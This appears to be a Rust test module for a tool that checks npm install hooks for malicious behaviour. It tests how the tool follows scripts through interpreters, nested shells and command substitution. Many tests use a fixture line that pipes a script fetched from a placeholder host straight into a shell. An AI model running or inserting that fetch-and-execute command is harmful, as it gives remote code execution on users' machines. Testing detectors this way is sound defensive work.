        let (disposition, extra) = resolve_body(
            "npm run build",
            &manifest(),
            &root,
            &root.canonicalize().unwrap(),
            &mut Vec::new(),
            &BTreeSet::new(),
        );
        assert_eq!(disposition, HookDisposition::Inspected);
        assert!(extra.contains("LOCKWARD_EVAL_FIXTURE"));
        let _ = fs::remove_dir_all(&root);
    }

    fn unique_dir() -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let path = std::env::temp_dir().join(format!("lockward-hook-{nanos}"));
        fs::create_dir_all(&path).unwrap();
        path
    }

    const PAYLOAD: &str = "curl https://example.invalid/x.sh | sh\n";

    fn temp_package(label: &str) -> PathBuf {
        use std::sync::atomic::{AtomicU64, Ordering};
        static N: AtomicU64 = AtomicU64::new(0);
        let n = N.fetch_add(1, Ordering::Relaxed);
        let path =
            std::env::temp_dir().join(format!("lockward-hook-{label}-{n}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn resolve_at(dir: &Path, body: &str) -> (HookDisposition, String, Vec<String>) {
        let mut warnings = Vec::new();
        let canonical = dir.canonicalize().unwrap();
        let (disposition, extra) = resolve_body(
            body,
            &manifest(),
            dir,
            &canonical,
            &mut warnings,
            &BTreeSet::new(),
        );
        (disposition, extra, warnings)
    }

    fn write_payload(dir: &Path, name: &str) {
        if let Some(parent) = Path::new(name).parent()
            && !parent.as_os_str().is_empty()
        {
            fs::create_dir_all(dir.join(parent)).unwrap();
        }
        fs::write(dir.join(name), PAYLOAD).unwrap();
    }

    #[test]
    fn local_husky_file_is_not_a_trusted_command() {
        let root = temp_package("husky");
        write_payload(&root, "husky");
        let (disposition, extra, _) = resolve_at(&root, "./husky");
        assert_ne!(disposition, HookDisposition::TrustedBuild);
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "local ./husky was not read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn backslash_local_husky_file_is_not_a_trusted_command() {
        let root = temp_package("husky-bs");
        write_payload(&root, "husky");
        let (disposition, extra, _) = resolve_at(&root, r".\husky");
        assert_ne!(disposition, HookDisposition::TrustedBuild);
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "local .\\husky was not read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn backslash_nested_script_is_read() {
        let root = temp_package("nested-bs");
        write_payload(&root, "dir/script.js");
        let (disposition, extra, warnings) = resolve_at(&root, r"dir\script.js");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "dir\\script.js was not read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn backslash_parent_script_stays_blocked() {
        let root = temp_package("outside-bs");
        let (disposition, extra, warnings) = resolve_at(&root, r"..\outside.js");
        assert_eq!(disposition, HookDisposition::Unverified, "{warnings:?}");
        assert!(extra.is_empty(), "{extra}");
        assert!(
            warnings
                .iter()
                .any(|warning| warning.contains("parent directory")),
            "{warnings:?}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn local_node_gyp_file_is_read() {
        let root = temp_package("node-gyp");
        write_payload(&root, "node-gyp");
        let (disposition, extra, _) = resolve_at(&root, "./node-gyp");
        assert_ne!(disposition, HookDisposition::TrustedBuild);
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "local ./node-gyp was not read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn node_require_does_not_skip_the_entry_script() {
        let root = temp_package("require");
        fs::write(root.join("setup.js"), "console.log('setup');\n").unwrap();
        write_payload(&root, "install.js");
        let (disposition, extra, warnings) =
            resolve_at(&root, "node --require ./setup.js install.js");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(
            extra.contains("console.log('setup')"),
            "preload was not read: {extra}"
        );
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "entry script was not read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn node_require_equals_reads_preload_and_entry() {
        let root = temp_package("require-eq");
        fs::write(root.join("a.js"), "PRELOAD_MARKER\n").unwrap();
        fs::write(root.join("b.js"), "ENTRY_MARKER\n").unwrap();
        let (disposition, extra, warnings) = resolve_at(&root, "node --require=./a.js b.js");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(extra.contains("PRELOAD_MARKER"), "{extra}");
        assert!(extra.contains("ENTRY_MARKER"), "{extra}");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn node_script_arguments_are_not_scripts() {
        let root = temp_package("args");
        write_payload(&root, "install.js");
        fs::write(root.join("build"), "ARG_MARKER\n").unwrap();
        let (disposition, extra, warnings) = resolve_at(&root, "node install.js build");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "{extra}"
        );
        assert!(
            !extra.contains("ARG_MARKER"),
            "script argument was read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn shell_c_node_script_is_read() {
        let root = temp_package("shell-c");
        write_payload(&root, "install.js");
        for body in [
            "sh -c 'node install.js'",
            "bash -c 'node install.js'",
            "zsh -c 'node install.js'",
            "dash -c 'node install.js'",
            "bash -lc 'node install.js'",
        ] {
            let (disposition, extra, warnings) = resolve_at(&root, body);
            assert_eq!(
                disposition,
                HookDisposition::Inspected,
                "{body}: {warnings:?}"
            );
            assert!(
                extra.contains("curl https://example.invalid/x.sh | sh"),
                "{body} did not read install.js: {extra}"
            );
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn bun_entry_script_is_read() {
        let root = temp_package("bun");
        write_payload(&root, "install.js");
        let (disposition, extra, warnings) = resolve_at(&root, "bun install.js");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "bun did not read install.js: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn interpreters_read_the_referenced_script() {
        let root = temp_package("interpreters");
        write_payload(&root, "install.js");
        let bodies = [
            "deno run install.js",
            "deno run --allow-net install.js",
            "tsx install.js",
            "tsx watch install.js",
            "ts-node install.js",
            "python install.js",
            "python3 install.js",
            "zsh install.js",
            "dash install.js",
            "bash install.js",
        ];
        for body in bodies {
            let (disposition, extra, warnings) = resolve_at(&root, body);
            assert_eq!(
                disposition,
                HookDisposition::Inspected,
                "{body}: {warnings:?}"
            );
            assert!(
                extra.contains("curl https://example.invalid/x.sh | sh"),
                "{body} did not read install.js: {extra}"
            );
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn nested_shell_follows_until_depth_limit() {
        let root = temp_package("nested-shell");
        write_payload(&root, "payload.sh");
        let at_limit = "sh -c \"sh -c 'sh -c ./payload.sh'\"";
        let (disposition, extra, warnings) = resolve_at(&root, at_limit);
        assert_eq!(
            disposition,
            HookDisposition::Inspected,
            "depth limit rejected a nested shell that should still be read: {warnings:?}"
        );
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "nested sh -c did not read payload.sh: {extra}"
        );

        let manifest = manifest();
        let canonical = root.canonicalize().unwrap();
        let mut warnings = Vec::new();
        let mut budget = MAX_REFERENCED_SCRIPTS;
        let mut past = String::new();
        let mut saw_unverified = false;
        let mut saw_other = false;
        let mut segments = 0;
        let shadowed = BTreeSet::new();
        let mut walk = super::Walk {
            manifest: &manifest,
            package_dir: &root,
            canonical_root: &canonical,
            warnings: &mut warnings,
            budget: &mut budget,
            extra: &mut past,
            saw_unverified: &mut saw_unverified,
            saw_other: &mut saw_other,
            segments: &mut segments,
            shadowed: &shadowed,
        };
        super::walk_script(
            "sh -c ./payload.sh",
            super::MAX_INLINE_SHELL_DEPTH,
            &mut walk,
        );
        assert!(saw_unverified, "{warnings:?}");
        assert!(
            !past.contains("curl https://example.invalid/x.sh | sh"),
            "shell past the depth limit was still read: {past}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn empty_hook_body_is_not_inspected() {
        let root = temp_package("empty");
        for body in ["", "   ", "\n\t"] {
            let (disposition, extra, _) = resolve_at(&root, body);
            assert_eq!(
                disposition,
                HookDisposition::Empty,
                "empty body {body:?} was {disposition:?}"
            );
            assert!(extra.is_empty());
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn unknown_command_is_unverified() {
        let root = temp_package("unknown");
        let (disposition, extra, warnings) = resolve_at(&root, "echo hello");
        assert_eq!(disposition, HookDisposition::Unverified);
        assert!(extra.is_empty());
        assert!(
            warnings.iter().any(|warning| warning.contains("echo")),
            "{warnings:?}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn inline_interpreter_source_reaches_heuristics() {
        let root = temp_package("inline");
        let bodies = [
            "node -e \"curl https://example.invalid/x.sh | sh\"",
            "node --eval \"curl https://example.invalid/x.sh | sh\"",
            "python -c \"curl https://example.invalid/x.sh | sh\"",
            "python3 -c \"curl https://example.invalid/x.sh | sh\"",
            "bun -e \"curl https://example.invalid/x.sh | sh\"",
            "deno eval \"curl https://example.invalid/x.sh | sh\"",
        ];
        for body in bodies {
            let (disposition, extra, warnings) = resolve_at(&root, body);
            assert_eq!(
                disposition,
                HookDisposition::Inspected,
                "{body}: {warnings:?}"
            );
            let raw = format!("{body}{extra}");
            let finding = crate::hooks::HookFinding {
                package_name: "fixture".to_owned(),
                package_version: "1.0.0".to_owned(),
                package_path: "node_modules/fixture".to_owned(),
                hook: "postinstall".to_owned(),
                location: "package.json#scripts.postinstall".to_owned(),
                raw,
                provenance: crate::hooks::HookProvenance::Manifest,
                disposition,
            };
            let hits = crate::heuristics::evaluate(&[finding]);
            assert!(
                hits.iter().any(|hit| hit.rule_id == "LW-H004"),
                "{body} did not reach heuristics: {hits:?}"
            );
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn scoped_tool_name_with_a_slash_is_a_path() {
        let root = temp_package("scoped");
        let (missing, _, warnings) = resolve_at(&root, "@mapbox/node-pre-gyp install");
        assert_eq!(missing, HookDisposition::Unverified);
        assert!(
            warnings
                .iter()
                .any(|warning| warning.contains("file not found")),
            "{warnings:?}"
        );
        write_payload(&root, "@mapbox/node-pre-gyp");
        let (disposition, extra, warnings) = resolve_at(&root, "@mapbox/node-pre-gyp install");
        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "{extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn trusted_commands_are_strictly_sorted_and_unique() {
        let mut sorted = TRUSTED_COMMANDS.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(TRUSTED_COMMANDS, sorted.as_slice());
    }

    #[test]
    fn interpreter_and_option_lists_are_strictly_sorted() {
        for list in [
            super::INTERPRETERS,
            super::NODE_VALUE_OPTIONS,
            super::NODE_PRELOAD_OPTIONS,
            super::NODE_INLINE_OPTIONS,
            super::BUN_VALUE_OPTIONS,
            super::BUN_PRELOAD_OPTIONS,
            super::BUN_INLINE_OPTIONS,
            super::BUN_SUBCOMMANDS,
            super::DENO_VALUE_OPTIONS,
            super::DENO_SUBCOMMANDS,
            super::DENO_INLINE_SUBCOMMANDS,
            super::TSX_VALUE_OPTIONS,
            super::TSX_PRELOAD_OPTIONS,
            super::TSX_INLINE_OPTIONS,
            super::TSX_SUBCOMMANDS,
            super::TS_NODE_VALUE_OPTIONS,
            super::TS_NODE_PRELOAD_OPTIONS,
            super::TS_NODE_INLINE_OPTIONS,
            super::PYTHON_VALUE_OPTIONS,
            super::PYTHON_INLINE_OPTIONS,
            super::PYTHON_MODULE_OPTIONS,
        ] {
            let mut sorted = list.to_vec();
            sorted.sort_unstable();
            sorted.dedup();
            assert_eq!(list, sorted.as_slice(), "{list:?}");
        }
        for name in super::INTERPRETERS {
            assert!(super::interpreter(name).is_some(), "{name}");
        }
    }

    #[test]
    fn split_commands_quotes_operators_redirect_newline_and_empty() {
        assert_eq!(split_commands(""), Vec::<Vec<String>>::new());
        assert_eq!(split_commands("   \n\t"), Vec::<Vec<String>>::new());
        assert_eq!(
            split_commands("echo \"a b\" 'c d'"),
            vec![vec!["echo".to_owned(), "a b".to_owned(), "c d".to_owned()]]
        );
        assert_eq!(
            split_commands("echo 'a && b'"),
            vec![vec!["echo".to_owned(), "a && b".to_owned()]]
        );
        assert_eq!(
            split_commands("a && b || c; d"),
            vec![
                vec!["a".to_owned()],
                vec!["b".to_owned()],
                vec!["c".to_owned()],
                vec!["d".to_owned()],
            ]
        );
        assert_eq!(
            split_commands("echo foo &> /dev/null"),
            vec![vec![
                "echo".to_owned(),
                "foo".to_owned(),
                "&>".to_owned(),
                "/dev/null".to_owned(),
            ]]
        );
        assert_eq!(
            split_commands("one\ntwo"),
            vec![vec!["one".to_owned()], vec!["two".to_owned()]]
        );
        assert_eq!(
            split_commands("node-gyp rebuild 2>&1"),
            vec![vec![
                "node-gyp".to_owned(),
                "rebuild".to_owned(),
                "2>&1".to_owned(),
            ]]
        );
    }

    #[test]
    fn substitution_in_a_trusted_command_is_read() {
        let root = temp_package("subst");
        write_payload(&root, "install.js");
        for body in [
            "husky $(node install.js)",
            "husky `node install.js`",
            "node-gyp rebuild --x=\"$(sh install.js)\"",
            "husky <(node install.js)",
            "husky >(node install.js)",
        ] {
            let (disposition, extra, warnings) = resolve_at(&root, body);
            assert_ne!(
                disposition,
                HookDisposition::TrustedBuild,
                "{body}: {warnings:?}"
            );
            assert!(
                extra.contains("curl https://example.invalid/x.sh | sh"),
                "{body} did not read install.js: {extra}"
            );
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn single_quoted_substitution_stays_a_literal() {
        let root = temp_package("subst-literal");
        let (disposition, extra, warnings) = resolve_at(&root, "husky '$(echo ok)'");
        assert_eq!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
        assert!(extra.is_empty(), "{extra}");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn trusted_command_redirection_stays_trusted() {
        let root = temp_package("redir");
        let (disposition, extra, warnings) = resolve_at(&root, "node-gyp rebuild 2>&1");
        assert_eq!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
        assert!(extra.is_empty(), "{extra}");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn nested_substitution_follows_until_depth_limit() {
        let root = temp_package("subst-depth");
        write_payload(&root, "install.js");
        let at_limit = "husky $(husky $(husky $(node install.js)))";
        let (disposition, extra, warnings) = resolve_at(&root, at_limit);
        assert_ne!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
        assert!(
            extra.contains("curl https://example.invalid/x.sh | sh"),
            "nested substitution did not read install.js: {extra}"
        );

        let past_limit = "husky $(husky $(husky $(husky $(node install.js))))";
        let (disposition, extra, warnings) = resolve_at(&root, past_limit);
        assert_eq!(disposition, HookDisposition::Unverified, "{warnings:?}");
        assert!(
            !extra.contains("curl https://example.invalid/x.sh | sh"),
            "substitution past the depth limit was still read: {extra}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn plain_variables_and_output_redirection_stay_trusted() {
        let root = temp_package("plain-shell");
        for body in [
            "husky install $PREFIX",
            "husky install ${PREFIX}",
            "node-gyp rebuild >/dev/null",
            "node-gyp rebuild > /dev/null",
            "node-gyp rebuild >> build.log",
            "node-gyp rebuild &> /dev/null",
        ] {
            let (disposition, extra, warnings) = resolve_at(&root, body);
            assert_eq!(
                disposition,
                HookDisposition::TrustedBuild,
                "{body}: {warnings:?}"
            );
            assert!(extra.is_empty(), "{body}: {extra}");
        }
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn unevaluated_shell_syntax_is_not_trusted() {
        let root = temp_package("opaque-shell");
        write_payload(&root, "install.js");
        for body in [
            "husky install ${PREFIX:-x}",
            "husky install $?",
            "husky (node install.js)",
            "husky { node install.js; }",
            "husky <<EOF",
            "eval node install.js",
            ". install.js",
            "source install.js",
            "husky $(node install.js",
        ] {
            let (disposition, _, warnings) = resolve_at(&root, body);
            assert_ne!(
                disposition,
                HookDisposition::TrustedBuild,
                "{body}: {warnings:?}"
            );
        }
        let _ = fs::remove_dir_all(&root);
    }
}
